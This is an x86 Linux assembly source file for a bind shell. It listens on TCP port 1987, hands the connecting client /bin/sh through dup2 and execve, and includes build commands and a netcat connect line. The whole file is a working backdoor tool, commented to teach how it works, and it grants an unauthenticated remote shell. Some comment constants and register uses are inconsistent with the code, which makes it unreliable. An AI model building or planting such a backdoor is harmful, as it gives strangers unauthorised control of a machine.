; bind-linux-x86.asm
; For Linux x86.
;
; Opens a remote /bin/sh on port 1987.
;
; Carlos Reventlov <carlos@reventlov.com>.
; First draft of this program dates back to 2007.
;
; Please see also bind.c.
;
; In this example we are going to use the Linux specific socketcall
; function.
;
; $ man 2 socketcall
;
; On the host site:
;
;   $ nasm -g -f elf -o bind.o bind-linux-x86.asm
;   $ ld -m elf_i386 -o bind bind.o
;   $ ./bind
;
; On the remote side:
;   $ nc <host> 1987
;
; Constants:
;
;   __NR_socketcall   = 102
;   __NR_execve       = 11
;   __NR_dup2         = 63
;   SYS_SOCKET        = 1
;   SYS_BIND          = 1
;   PF_INET           = 2
;   IPPROTO_TCP       = 6
;   SOCK_STREAM       = 1
;
; Useful reading:
;   /usr/include/asm/unistd_32.h (syscall table)
;   /usr/include/linux/net.h (socketcall constants)
;   /usr/include/bits/socket.h (socket constants)

global _start

section .text

_start:

  ; An IPV4 socket.
  ; socketcall(SYS_SOCKET, [ AF_INET, SOCK_STREAM, IPPROTO_TCP ])

  ; Argument for socketcall
  push byte 0x06    ; IPPROTO_TCP
  push byte 0x01    ; SOCK_STREAM
  push byte 0x02    ; PF_INET
  mov ecx, esp      ; Set ecx to point the top of the stack.

  ; Preparing syscall.
  mov bl, 0x01      ; SYS_SOCKET
  mov al, 0x66      ; socketcall
  int 0x80          ; Interrupt.

  ; Saving result to esi <sock>.
  mov esi, eax

  ; socketcall(SYS_BIND, [ <sock>, <address>, sizeof sockaddr_in])
  push byte 0x00    ; INADDR_ANY
  push word [port]  ; 1987
  push word 0x02    ; PF_INET
  mov ecx, esp      ; Set ecx to point the top of the stack (<address>).

  push byte 0x10    ; sizeof(struct sockaddr_in)
  push ecx          ; <address>
  push esi          ; <sock>

  mov ecx, esp      ; Set ecx to point to the top of the stack.

  mov bl, 0x02      ; SYS_BIND

  mov al, 0x66      ; socketcall

  int 0x80          ; Interrupt.

  ; socketcall(SYS_LISTEN, [ <sock>, 0 ])
  push 0x00         ; Listen any.
  push esi          ; <sock>
  mov ecx, esp      ; Set ecx to point to the top of the stack.
  mov bl, 0x04      ; SYS_LISTEN
  mov al, 0x66      ; socketcall
  int 0x80          ; Interrupt.

  ; socketcall(SYS_ACCEPT, [ <sock>, 0, 0 ])
  push 0x00
  push 0x00
  push esi          ; <sock>
  mov ecx, esp      ; Set ecx to point to the top of the stack.

  mov bl, 0x05      ; SYS_ACCEPT
  mov al, 0x66      ; socketcall
  int 0x80          ; Interrupt

  mov esi, eax ; Overwriting esi with new eax (<conn>).

  ; dup2(<conn>, STDIN_FILENO)
  mov ecx, 0x00     ; STDIN_FILENO
  mov ebx, esi      ; <conn>
  mov eax, 0x3f     ; dup2 (63)
  int 0x80          ; Interrupt

  ; dup2(<conn>, STDOUT_FILENO)
  mov ecx, 0x01     ; STDOUT_FILENO
  mov ebx, eax      ; <conn>
  mov eax, 0x3f     ; dup2
  int 0x80          ; Interrupt

  ; dup2(<conn>, STDIN_FILENO)
  mov ecx, 0x02     ; STDERR_FILENO
  mov ebx, eax      ; <conn>
  mov eax, 0x3f     ; dup2
  int 0x80          ; Interrupt.

  ; execve("/bin/sh", ["/bin/sh"], 0)
  push byte 0x00    ; String boundary.
  push dword [shell+4]
  push dword [shell]

  mov ebx, esp      ; Setting ebx to point to the top of the stack.

  push 0x00         ;
  push ebx          ; <program>
  mov ecx, esp      ; <program[0]>
  mov al, 0x0b      ; execve (11)
  int 0x80          ; Interrupt

section .data:
  port: dd 0xc307     ; 1987
  shell: db "/bin/sh" ; Shell to execute.


